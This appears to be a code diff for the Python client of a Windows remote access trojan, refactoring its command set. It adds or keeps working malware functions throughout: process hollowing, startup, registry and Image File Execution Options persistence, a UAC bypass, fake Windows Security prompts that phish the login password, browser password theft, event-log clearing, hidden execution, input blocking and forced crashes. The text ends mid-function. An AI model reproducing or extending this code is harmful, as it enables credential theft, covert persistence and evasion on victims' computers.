@@ -1,14 +1,15 @@
 # coding=utf-8
+import argparse
 import base64
 import contextlib
 import ctypes
+import datetime
 import inspect
 import json
 import locale
 import os
 import pathlib
 import platform
-import re
 import shutil
 import socket
 import sqlite3
@@ -37,14 +38,15 @@ import win32profile
 import win32security
 import win32service
 import win32ts
-import winerror
 import wmi
 from Crypto.Cipher import AES
 
 import askpass
 import filewatch
 import keylogger
+import procmon
 import runpe
+import wer
 
 TEMP_DIR = os.path.expanduser('~') + r'\AppData\Local\Temp'
 EXECUTABLE_PATH = os.path.realpath(sys.executable)
@@ -124,7 +126,7 @@ class Command:
         try:
             if not path:
                 return 0, 'null'
-            if os.path.exists(path):
+            if os.path.isdir(path):
                 os.chdir(path)
                 return 1, 'null'
             else:
@@ -133,12 +135,21 @@ class Command:
             return 0, '[-] Error: ' + str(exception)
 
     @staticmethod
-    def run(process):
+    def ls(path=None):
         try:
-            if not process:
-                return 0, '[-] No process name specified'
-            p = subprocess.Popen(process)
-            return 1, '[+] Process created: ' + str(p.pid)
+            paths = []
+            if not path:
+                path = os.getcwd()
+            if not os.path.isdir(path):
+                return 0, '[-] Cannot find the path specified'
+            root, dirs, files = next(os.walk(path))
+            for dir_name in dirs:
+                paths.append([dir_name, None, Helper.get_mtime(os.path.join(root, dir_name))])
+            for filename in files:
+                paths.append([filename, Helper.get_readable_size(os.stat(os.path.join(root, filename)).st_size),
+                              Helper.get_mtime(os.path.join(root, filename))])
+            return 1, tabulate.tabulate(paths, headers=['Name', 'Size', 'Date modified'],
+                                        colalign=('left', 'right',)) + os.linesep
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
 
@@ -266,6 +277,71 @@ class Command:
             client.send_text(0, '[-] Error: ' + str(exception))
 
     @staticmethod
+    def ps():
+        try:
+            processes = []
+            for proc in psutil.process_iter():
+                try:
+                    process = [proc.pid, proc.name(), proc.exe()]
+                    processes.append(process)
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    pass
+            return 1, tabulate.tabulate(processes, headers=['PID', 'Name', 'Executable path']) + os.linesep
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def pkill(process):
+        try:
+            if not process:
+                return 0, '[-] No process id or name specified'
+            try:
+                pid = int(process)
+                psutil.Process(pid).kill()
+                return 1, '[+] Killed'
+            except ValueError:
+                for proc in psutil.process_iter():
+                    if proc.name().lower() == process.lower():
+                        proc.kill()
+                return 1, '[+] Killed'
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def run(process):
+        try:
+            if not process:
+                return 0, '[-] No process name specified'
+            p = subprocess.Popen(process)
+            return 1, '[+] Process created: ' + str(p.pid)
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def hiderun(process):
+        try:
+            if not process:
+                return 0, '[-] No process name specified'
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+            info.wShowWindow = 0
+            p = subprocess.Popen(process, startupinfo=info)
+            return 1, '[+] Process created: {}'.format(p.pid)
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def persistence_startup():
+        try:
+            exec_copy = os.path.join(
+                os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup',
+                os.path.basename(EXECUTABLE_PATH))
+            shutil.copy2(EXECUTABLE_PATH, exec_copy)
+            return 1, '[+] Copied to startup folder'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
     def persistence_registry():
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
@@ -331,7 +407,7 @@ class Command:
             if not ctypes.windll.shell32.IsUserAnAdmin():
                 filename = 'bypassuac_clr.dll'
                 if not os.path.isfile(filename):
-                    return 0, '[-] Missing {0}'.format(filename)
+                    return 0, '[-] Missing {}'.format(filename)
                 dll_path = os.path.abspath(filename)
                 reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
                 winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
@@ -408,51 +484,6 @@ class Command:
             return 0, '[-] Error: ' + str(exception)
 
     @staticmethod
-    def idletime():
-        try:
-            return 1, '[+] User has been idle for: ' + str(
-                (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0) + ' seconds'
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def poweroff():
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.ZwShutdownSystem(2)
-
-    @staticmethod
-    def bsod():
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.RtRaiseHardError(0xc0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
-
-    @staticmethod
-    def setcritical():
-        try:
-            is_critical = ctypes.c_int(1)
-            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
-            handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
-            status = ctypes.windll.ntdll.NtSetInformationProcess(handle_process, 29, ctypes.byref(is_critical),
-                                                                 ctypes.sizeof(ctypes.c_int))
-            if not status:
-                return 1, '[+] Success'
-            else:
-                return 0, '[-] Error: ' + str(status)
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def runpe():
-        try:
-            src = r'c_client.exe'
-            dst = r'C:\Windows\explorer.exe'
-            if os.path.isfile(src) and os.path.isfile(dst):
-                return 1, runpe.hollow_process(src, dst)
-            else:
-                return 0, '[-] File not found'
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
     def get_passwords(browser):
         try:
             user_data = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data'
@@ -480,6 +511,374 @@ class Command:
             return 0, '[-] Error: ' + str(exception)
 
     @staticmethod
+    def getinfo():
+        try:
+            computer = wmi.WMI()
+            computer_info = computer.Win32_ComputerSystem()[0]
+            gpu_info = computer.Win32_VideoController()[0]
+            proc_info = computer.Win32_Processor()[0]
+            info = {'pid': psutil.Process().pid, 'username': psutil.Process().username(), 'exec_path': EXECUTABLE_PATH,
+                    'intgty_lvl': Helper.get_integrity_level(), 'uac_lvl': Helper.get_uac_level(),
+                    'hostname': platform.node(), 'platform': platform.system(), 'version': platform.version(),
+                    'architecture': platform.machine(), 'manufacturer': computer_info.Manufacturer,
+                    'model': computer_info.Model,
+                    'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB', 'cpu': proc_info.Name,
+                    'graphic_card': gpu_info.name}
+            result = ''
+            for k, v in info.items():
+                result += '{0:15}{1}'.format(k, v) + '\n'
+            return 1, result
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def idletime():
+        try:
+            return 1, '[+] User has been idle for: ' + str(
+                (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0) + ' seconds'
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def drives():
+        try:
+            parts = []
+            partitions = psutil.disk_partitions()
+            for partition in partitions:
+                try:
+                    partition_usage = psutil.disk_usage(partition.mountpoint)
+                except PermissionError:
+                    continue
+                part = [partition.device, partition.fstype, Helper.get_readable_size(partition_usage.total),
+                        Helper.get_readable_size(partition_usage.used),
+                        Helper.get_readable_size(partition_usage.free), str(partition_usage.percent) + ' %']
+                parts.append(part)
+
+            return 1, tabulate.tabulate(parts,
+                                        headers=['Mount point', 'File system', 'Total size', 'Used', 'Free',
+                                                 'Percentage']) + os.linesep
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def startup():
+        try:
+            c = wmi.WMI()
+            startup = []
+            for s in c.Win32_StartupCommand():
+                startup.append([s.Caption, s.Command, s.Location])
+            return 1, tabulate.tabulate(sorted(startup), headers=['Caption', 'Command', 'Location'])
+        except Exception as exception:
+            return 0, '[-] {}'.format(exception)
+
+    @staticmethod
+    def software():
+        try:
+            software_list = []
+            for item in ((winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY),
+                         (winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY),
+                         (winreg.HKEY_CURRENT_USER, 0)):
+                software_list += Helper.enum_uninstall_key(*item)
+            return 1, tabulate.tabulate(sorted(software_list, key=lambda s: s[0].lower()),
+                                        headers=['Name', 'Version', 'Publisher'])
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def ifeo_debugger(args):
+        try:
+            status, result = Helper.parse_arguments({'exec': True, 'debugger': False}, args)
+            if not status:
+                return 0, '[-] Error: {}'.format(result)
+            debugger = result['debugger'] if result['debugger'] else EXECUTABLE_PATH
+            reg_path = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{}'.format(
+                result['exec'])
+            winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_WRITE)
+            winreg.SetValueEx(key, 'debugger', 0, winreg.REG_SZ, debugger)
+            winreg.CloseKey(key)
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def ifeo_globalflag(exec):
+        try:
+            if not exec:
+                return 0, '[-] No executable name specified'
+            if not ctypes.windll.shell32.IsUserAnAdmin():
+                return 0, '[-] Operation requires elevation'
+            cmd_list = [
+                r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution '
+                r'Options\{}" /v GlobalFlag /t REG_DWORD /d 512 /f'.format(exec),
+                r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{}" /v '
+                r'ReportingMode /t REG_DWORD /d 1 /f'.format(exec),
+                r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{}" /v '
+                r'MonitorProcess /d {} /f'.format(exec, EXECUTABLE_PATH)
+            ]
+            result = ''
+            for cmd in cmd_list:
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+            return 1, result
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def runpe():
+        try:
+            src = r'c_client.exe'
+            dst = r'C:\Windows\explorer.exe'
+            if os.path.isfile(src) and os.path.isfile(dst):
+                return 1, runpe.hollow_process(src, dst)
+            else:
+                return 0, '[-] File not found'
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def poweroff():
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.ZwShutdownSystem(2)
+
+    @staticmethod
+    def bsod():
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.RtRaiseHardError(0xc000021a, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+
+    @staticmethod
+    def setcritical(flag):
+        try:
+            flag = flag.lower() in ('true', '1', '')
+            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+            result = ctypes.windll.ntdll.RtlSetProcessIsCritical(flag, 0, 0)
+            if not result:
+                return 1, '[+] Success'
+            else:
+                return 0, '[-] Error: {}'.format(result)
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def msgbox(args):
+        try:
+            status, result = Helper.parse_arguments({'text': True, 'title': False}, args)
+            if not status:
+                return 0, '[-] Error: {}'.format(result)
+            threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(None, result['text'], result['title'], 0),
+                             daemon=True).start()
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def askuac():
+        try:
+            if not ctypes.windll.shell32.IsUserAnAdmin():
+                if not getattr(sys, 'frozen', False):
+                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv),
+                                                                 None, 1)
+                else:
+                    exec_copy = os.path.join(TEMP_DIR, os.path.basename(EXECUTABLE_PATH))
+                    shutil.copy2(EXECUTABLE_PATH, exec_copy)
+                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', r'C:\Windows\system32\cmd.exe',
+                                                                 ' /c {}'.format(exec_copy),
+                                                                 None, 1)
+                if result > 32:
+                    return 1, '[+] Success'
+                else:
+                    return 0, '[-] Error: {}'.format(result)
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def askpass():
+        try:
+            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security\',\'\',[Environment]::Username,' \
+                   '[Environment]::UserDomainName); '
+            cmd2 = 'echo $cred.getnetworkcredential().password;'
+            while True:
+                p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
+                                     stderr=subprocess.PIPE)
+                username = os.getlogin()
+                password = p.stdout.read().decode().strip()
+                if askpass.logon_user(username, password):
+                    return 1, password
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def askpass_dim(client):
+        def func(result):
+            client.send_text(1, result)
+
+        try:
+            askpass.switch_desktop(func)
+        except Exception as exception:
+            client.send_text(0, '[-] {}'.format(exception))
+
+    @staticmethod
+    def zip(path=None):
+        try:
+            if path is None or not os.path.exists(path):
+                path = os.getcwd()
+            shutil.make_archive(os.path.basename(path), 'zip', path)
+            return 1, '[-] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def unzip(filename):
+        try:
+            if os.path.isfile(filename):
+                path = os.path.join(os.getcwd(), pathlib.Path(filename).stem)
+                shutil.unpack_archive(filename, path)
+                return 1, '[-] Success'
+            else:
+                return 0, '[-] File not found'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def openwin():
+        try:
+            titles = []
+            for window in pyautogui.getAllWindows():
+                if window.title.strip():
+                    titles.append(window.title)
+            return 1, '\n'.join(titles)
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def activewin():
+        try:
+            return 1, pyautogui.getActiveWindowTitle()
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def getclip():
+        try:
+            return 1, pyperclip.paste()
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def setclip(text):
+        try:
+            pyperclip.copy(text)
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def filewatch(client, path=None):
+        event = threading.Event()
+
+        def func(result):
+            client.send_text(1, result)
+
+        def eof():
+            client.send_text(-1, 'null')
+            event.set()
+
+        if path is None or not os.path.exists(path):
+            path = os.path.join(os.path.expanduser('~'), 'Desktop')
+        fw = filewatch.FileWatch().get_instance()
+        fw.start_monitor(path, func, eof)
+        while True:
+            cmd = client.recv()
+            print(cmd)
+            if cmd == 'stop':
+                fw.stop_monitor()
+                event.wait()
+                break
+
+    @staticmethod
+    def procmon_start(args):
+        try:
+            pm = procmon.ProcessMonitor().get_instance()
+            if pm.status:
+                return 0, '[-] Already running'
+            status, result = Helper.parse_arguments({'cmd': True, 'process': True}, args)
+            if not status:
+                return 0, '[-] Error: {}'.format(result)
+            cmd = result['cmd']
+            process = [x.strip() for x in result['process'].split(',')]
+            if hasattr(Command, cmd):
+                func = getattr(Command, cmd)
+            else:
+                return 0, '[-] No such command: {}'.format(cmd)
+            threading.Thread(target=pm.start, args=(process, func,)).start()
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def procmon_stop():
+        pm = procmon.ProcessMonitor().get_instance()
+        if not pm.status:
+            return 0, '[-] Not running'
+        pm.stop()
+        return 1, '[+] Success'
+
+    @staticmethod
+    def freeze(flag):
+        try:
+            flag = flag.lower() in ('true', '1', '')
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                ctypes.windll.user32.BlockInput(flag)
+                return 1, '[+] {}'.format(flag)
+            else:
+                return 0, '[-] Operation requires elevation'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def openurl(url):
+        try:
+            if not url:
+                return 0, '[-] URL required'
+            webbrowser.open(url)
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def wallpaper(filename):
+        try:
+            if os.path.isfile(filename):
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, str(os.path.realpath(filename)), 0)
+                return 1, '[+] Success'
+            else:
+                return 0, '[-] File not found'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def clearlog():
+        try:
+            cmd_list = [r'wevtutil cl System',
+                        r'wevtutil cl Security',
+                        r'wevtutil cl Application']
+            result = ''
+            for cmd in cmd_list:
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+            return 1, result
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def hideme():
+        try:
+            win32api.SetFileAttributes(EXECUTABLE_PATH, 0x02 | 0x04)
+            return 1, str(win32api.GetFileAttributes(EXECUTABLE_PATH))
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
     def replace_files():
         try:
             sys_dir = r'C:\Windows\System32'
@@ -494,19 +893,6 @@ class Command:
                 p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
             return 1, result
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def list_software():
-        try:
-            software_list = []
-            for item in ((winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY),
-                         (winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY),
-                         (winreg.HKEY_CURRENT_USER, 0)):
-                software_list += Helper.enum_uninstall_key(*item)
-            return 1, tabulate.tabulate(sorted(software_list, key=lambda s: s[0].lower()),
-                                        headers=['Name', 'Version', 'Publisher'])
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
 
@@ -536,274 +922,27 @@ class Command:
             client.send_text(0, '[-] Error: ' + str(exception))
 
     @staticmethod
-    def ps():
+    def enable_wer():
         try:
-            processes = []
-            for proc in psutil.process_iter():
-                try:
-                    process = [proc.pid, proc.name(), proc.exe()]
-                    processes.append(process)
-                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                    pass
-            return 1, tabulate.tabulate(processes, headers=['PID', 'Name', 'Executable path']) + os.linesep
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def drives():
-        try:
-            parts = []
-            partitions = psutil.disk_partitions()
-            for partition in partitions:
-                try:
-                    partition_usage = psutil.disk_usage(partition.mountpoint)
-                except PermissionError:
-                    continue
-                part = [partition.device, partition.fstype, Helper.get_readable_size(partition_usage.total),
-                        Helper.get_readable_size(partition_usage.used),
-                        Helper.get_readable_size(partition_usage.free), str(partition_usage.percent) + ' %']
-                parts.append(part)
-
-            return 1, tabulate.tabulate(parts,
-                                        headers=['Mount point', 'File system', 'Total size', 'Used', 'Free',
-                                                 'Percentage']) + os.linesep
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def getinfo():
-        try:
-            computer = wmi.WMI()
-            computer_info = computer.Win32_ComputerSystem()[0]
-            gpu_info = computer.Win32_VideoController()[0]
-            proc_info = computer.Win32_Processor()[0]
-            info = {'pid': psutil.Process().pid, 'username': psutil.Process().username(), 'exec_path': EXECUTABLE_PATH,
-                    'intgty_lvl': Helper.get_integrity_level(), 'uac_lvl': Helper.get_uac_level(),
-                    'hostname': platform.node(), 'platform': platform.system(), 'version': platform.version(),
-                    'architecture': platform.machine(), 'manufacturer': computer_info.Manufacturer,
-                    'model': computer_info.Model,
-                    'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB', 'cpu': proc_info.Name,
-                    'graphic_card': gpu_info.name}
-            result = ''
-            for k, v in info.items():
-                result += '{0:15}{1}'.format(k, v) + '\n'
-            return 1, result
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def msgbox(msg):
-        try:
-            msg = re.findall('[\']([^\']*)[\']', msg)
-            if len(msg) != 2:
-                return 0, '[-] Two arguments required'
-            threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(None, msg[0], msg[1], 0),
-                             daemon=True).start()
-            return 1, '[+] Success'
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def clearlog():
-        try:
-            cmd_list = [r'wevtutil cl System',
-                        r'wevtutil cl Security',
-                        r'wevtutil cl Application']
-            result = ''
-            for cmd in cmd_list:
-                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
-            return 1, result
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def askpass():
-        try:
-            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security Update\',\'\',[Environment]::Username,' \
-                   '[Environment]::UserDomainName); '
-            cmd2 = 'echo $cred.getnetworkcredential().password;'
-            p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
-                                 stderr=subprocess.PIPE)
-            return 1, str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def askpass_logon():
-        try:
-            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security\',\'\',[Environment]::Username,' \
-                   '[Environment]::UserDomainName); '
-            cmd2 = 'echo $cred.getnetworkcredential().password;'
-            while True:
-                p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
-                                     stderr=subprocess.PIPE)
-                username = os.getlogin()
-                password = p.stdout.read().decode().strip()
-                if Helper.logon_user(username, password):
-                    return 1, password
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def askpass_secure_desktop(client):
-        def func(result):
-            client.send_text(1, result)
-
-        try:
-            askpass.switch_desktop(func)
-        except Exception as exception:
-            client.send_text(0, '[-] {}'.format(exception))
-
-    @staticmethod
-    def askuac():
-        try:
-            if not ctypes.windll.shell32.IsUserAnAdmin():
-                if not getattr(sys, 'frozen', False):
-                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv),
-                                                                 None, 1)
-                else:
-                    exec_copy = os.path.join(TEMP_DIR, os.path.basename(EXECUTABLE_PATH))
-                    shutil.copy2(EXECUTABLE_PATH, exec_copy)
-                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', r'C:\Windows\system32\cmd.exe',
-                                                                 ' /c {}'.format(exec_copy),
-                                                                 None, 1)
-                if result > 32:
-                    return 1, '[+] Success'
-                else:
-                    return 0, '[-] Error: {}'.format(result)
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def hideme():
-        try:
-            win32api.SetFileAttributes(EXECUTABLE_PATH, 0x02 | 0x04)
-            return 1, str(win32api.GetFileAttributes(EXECUTABLE_PATH))
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def active_window():
-        try:
-            return 1, pyautogui.getActiveWindowTitle()
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def open_windows():
-        try:
-            titles = []
-            for window in pyautogui.getAllWindows():
-                if window.title.strip():
-                    titles.append(window.title)
-            return 1, '\n'.join(titles)
-        except Exception as exception:
-            return 0, '[-] Error: ' + str(exception)
-
-    @staticmethod
-    def set_wallpaper(filename):
-        try:
-            if os.path.isfile(filename):
-                ctypes.windll.user32.SystemParametersInfoW(20, 0, str(os.path.realpath(filename)), 0)
-                return 1, '[+] Success'
-            else:
-                return 0, '[-] File not found'
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def get_clipboard():
-        try:
-            return 1, pyperclip.paste()
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def set_clipboard(text):
-        try:
-            pyperclip.copy(text)
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\Windows Error Reporting', 0,
+                                 winreg.KEY_WRITE)
+            winreg.SetValueEx(key, 'DontShowUI', 0, winreg.REG_SZ, '0')
+            winreg.CloseKey(key)
             return 1, '[+] Success'
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
 
     @staticmethod
-    def zip(path=None):
+    def wer(path=None, process=None):
         try:
-            if path is None or not os.path.exists(path):
-                path = os.getcwd()
-            shutil.make_archive(os.path.basename(path), 'zip', path)
-            return 1, '[-] Success'
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def unzip(filename):
-        try:
-            if os.path.isfile(filename):
-                path = os.path.join(os.getcwd(), pathlib.Path(filename).stem)
-                shutil.unpack_archive(filename, path)
-                return 1, '[-] Success'
-            else:
-                return 0, '[-] File not found'
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def open_url(url):
-        try:
-            if not url:
-                return 0, '[-] URL required'
-            webbrowser.open(url)
+            if process:
+                process = psutil.Process(process)
+                path = process.exe()
+                process.kill()
+            threading.Thread(target=wer.report_error, args=(path,), daemon=True).start()
             return 1, '[+] Success'
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def run_hide(process):
-        try:
-            info = subprocess.STARTUPINFO()
-            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
-            info.wShowWindow = 0
-            p = subprocess.Popen(process, startupinfo=info)
-            return 1, '[+] Process created: {}'.format(p.pid)
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def block_input(flag):
-        try:
-            flag = flag.lower() in ('true', '1')
-            if ctypes.windll.shell32.IsUserAnAdmin():
-                ctypes.windll.user32.BlockInput(flag)
-                return 1, '[+] {}'.format(flag)
-            else:
-                return 0, '[-] Operation requires elevation'
-        except Exception as exception:
-            return 0, '[-] Error: {}'.format(exception)
-
-    @staticmethod
-    def filewatch(client, path=None):
-        event = threading.Event()
-
-        def func(result):
-            client.send_text(1, result)
-
-        def eof():
-            client.send_text(-1, 'null')
-            event.set()
-
-        if path is None or not os.path.exists(path):
-            path = os.path.join(os.path.expanduser('~'), 'Desktop')
-        fw = filewatch.FileWatch().get_instance()
-        fw.start_monitor(path, func, eof)
-        while True:
-            cmd = client.recv()
-            print(cmd)
-            if cmd == 'stop':
-                fw.stop_monitor()
-                event.wait()
-                break
 
 
 class Helper:
@@ -968,14 +1107,6 @@ class Helper:
         return software_list
 
     @staticmethod
-    def get_readable_size(bytes, suffix='B'):
-        factor = 1024
-        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
-            if bytes < factor:
-                return f'{bytes:.2f}{unit}{suffix}'
-            bytes /= factor
-
-    @staticmethod
     def get_integrity_level():
         intgty_lvl = {
             0x0000: 'Untrusted',
@@ -1019,18 +1150,45 @@ class Helper:
             return None
 
     @staticmethod
-    def logon_user(username, password):
+    def get_mtime(filename):
+        return datetime.datetime.utcfromtimestamp(os.stat(filename).st_mtime).strftime('%Y-%m-%d %H:%M')
+
+    @staticmethod
+    def get_readable_size(bytes, suffix='B'):
+        factor = 1024
+        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
+            if bytes < factor:
+                return f'{bytes:.2f} {unit}{suffix}'
+            bytes /= factor
+
+    @staticmethod
+    def parse_arguments(arg_dict, arg):
+        parser = ArgumentParser()
+        for key in arg_dict:
+            parser.add_argument('--{}'.format(key), type=str, nargs='*', required=arg_dict[key])
+        d = vars(parser.parse_args(arg.split()))
+        if parser.error_message:
+            return 0, parser.error_message
+        for k in d:
+            d[k] = ' '.join(d[k]) if d[k] else None
+        return 1, d
+
+
+class ArgumentParser(argparse.ArgumentParser):
+    def __init__(self, *args, **kwargs):
+        super(ArgumentParser, self).__init__(*args, **kwargs)
+        self.error_message = ''
+
+    def error(self, message: str):
+        self.error_message = message
+
+    def parse_args(self, *args, **kwargs):
+        result = None
         try:
-            token = win32security.LogonUser(username, None, password, win32security.LOGON32_LOGON_INTERACTIVE,
-                                            win32security.LOGON32_PROVIDER_DEFAULT)
-            token.Close()
